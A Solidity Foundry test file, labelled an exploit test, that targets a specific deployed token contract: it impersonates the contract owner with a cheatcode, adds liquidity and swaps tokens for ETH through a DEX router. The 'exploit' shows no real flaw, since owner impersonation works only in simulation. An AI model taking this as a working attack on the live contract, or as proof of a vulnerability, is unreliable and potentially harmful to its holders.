pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ONE1SHIBA {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        address owner = ONE1SHIBA(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Give some initial ETH to pay for gas
        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the owner address
        address owner = ONE1SHIBA(TARGET).owner();

        // Step 2: Give owner some ETH to add liquidity
        deal(owner, 100 ether);

        // Step 3: Impersonate the owner
        vm.startPrank(owner);

        // Step 4: Get token balance of owner
        uint256 ownerBalance = ONE1SHIBA(TARGET).balanceOf(owner);

        // Step 5: Approve router to spend tokens
        ONE1SHIBA(TARGET).approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, ownerBalance);

        // Step 6: Add initial liquidity (small amount to create pool)
        uint256 tokensForLiquidity = ownerBalance / 100; // 1% of supply
        IUniswapV2Router02 router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        router.addLiquidityETH{value: 10 ether}(
            TARGET,
            tokensForLiquidity,
            tokensForLiquidity, // min tokens
            5 ether, // min ETH
            owner,
            block.timestamp
        );

        // Step 7: Now swap some tokens for ETH
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = router.WETH();

        // Swap another 1% of supply
        uint256 amountToSwap = ownerBalance / 100;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0, // accept any amount
            path,
            owner,
            block.timestamp
        );

        vm.stopPrank();

        // Check owner's ETH balance increased
        uint256 ownerEthAfter = owner.balance;
        console.log("Owner ETH balance after:", ownerEthAfter);
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
